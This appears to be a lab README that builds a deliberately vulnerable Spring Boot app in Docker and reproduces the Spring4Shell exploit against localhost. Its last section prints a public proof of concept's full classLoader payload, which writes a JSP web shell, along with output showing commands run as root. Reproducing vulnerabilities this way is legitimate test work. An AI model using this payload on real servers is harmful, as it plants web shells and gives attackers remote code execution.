# Spring4Shell test

## Setup vulnerable application 

### Install openjdk >= 9

Install and setup on manjaro and archlinux
```bash
$ yay -S jdk11-openjdk
$ sudo archlinux-java set java-11-openjdk
```

### Build vuln application

These are the steps I followed to build the vuln app in this repo:

Go to https://start.spring.io/#!type=maven-project&language=java&platformVersion=2.6.5&packaging=jar&jvmVersion=11&groupId=com.example&artifactId=demo&name=demo&description=Demo%20project%20for%20Spring%20Boot&packageName=com.example.demo&dependencies=web,thymeleaf

Unzip the generated project

Since I like to know what I'm doing I followed the great tutorial at https://spring.io/guides/gs/handling-form-submission/

#### Build war file

Add war packaging info to `pom.xml` file:

```xml
	<groupId>com.example</groupId>
	<artifactId>demo</artifactId>
	<packaging>war</packaging>
	<version>0.0.1-SNAPSHOT</version>
	<name>demo</name>
	<description>Demo project for Spring Boot</description>
```

Add final name so that package will be named `demo.war`, in `pom.xml` under the `<build>` section
```xml
<build>
	<finalName>demo</finalName>
	[...]
</build>
```

run maven
```
$ cd demo
$ mvn clean package
```

which creates `demo/target/demo.war`

### Check for Spring in package

Confirm that an application uses spring framework
```
$ mkdir demo_src
$ mv demo/target/demo.war demo_src
$ cd demo_src
$ unzip demo.war
$ find . -name 'spring-beans-*.jar'  
./BOOT-INF/lib/spring-beans-5.3.17.jar
```

Apparently, people are saying that you can also check for the `CachedIntrospectionResults.class` file.

### Run and test the app:

Using the Dockerfile in this repo, simply run the following commands:

```bash
$ docker build -t eq/spring4shell ./
$ docker container run -it --publish 8080:8080 eq/spring4shell
```

#### App testing: 

```bash
$ curl -i http://127.0.0.1:8080/demo/greeting
HTTP/1.1 200 
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Transfer-Encoding: chunked
Date: Thu, 31 Mar 2022 10:43:48 GMT

<!DOCTYPE HTML>
<html>
<head> 
    <title>Getting Started: Handling Form Submission</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
	<h1>Form</h1>
    <form action="/greeting" method="post">
    	<p>Id: <input type="text" id="id" name="id" value="0" /></p>
        <p>Message: <input type="text" id="content" name="content" value="" /></p>
        <p><input type="submit" value="Submit" /> <input type="reset" value="Reset" /></p>
    </form>
</body>
</html>
$ # Testing the form:
$ curl -i http://127.0.0.1:8080/demo/greeting -d 'id=1&content=message_content'
HTTP/1.1 200 
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Transfer-Encoding: chunked
Date: Thu, 31 Mar 2022 10:44:41 GMT

<!DOCTYPE HTML>
<html>
<head> 
    <title>Getting Started: Handling Form Submission</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
	<h1>Result</h1>
    <p >id: 1</p>
    <p >content: message_content</p>
    <a href="/greeting">Submit another message</a>
</body>
</html>
```

## Testing the exploit:

Slightly modified PoC from: https://github.com/BobTheShoplifter/Spring4Shell-POC can be found in the `poc.py` file.

Modifications performed:
 - Change directory to `webapps/demo` to match the demo
 - Add debug prints


```bash
$ python poc.py --url http://127.0.0.1:8080/demo/greeting 
[+] Requesting url with content:
Headers: {'suffix': '%>//', 'c1': 'Runtime', 'c2': '<%', 'DNT': '1', 'Content-Type': 'application/x-www-form-urlencoded'}
Data: class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/demo&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
=======================================
[+] Checking shell properly uploaded at: http://127.0.0.1:8080/demo/tomcatwar.jsp
[+] Confirming shell at:http://127.0.0.1:8080/demo/tomcatwar.jsp?pwd=j&cmd=id
```

RCE result:
```bash
$ curl http://127.0.0.1:8080/demo/tomcatwar.jsp\?pwd\=j\&cmd\=id -o test
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2530    0  2530    0     0  36332      0 --:--:-- --:--:-- --:--:-- 36666
$ cat test 
uid=0(root) gid=0(root) groups=0(root)

//
- if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } -
- if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } -
```


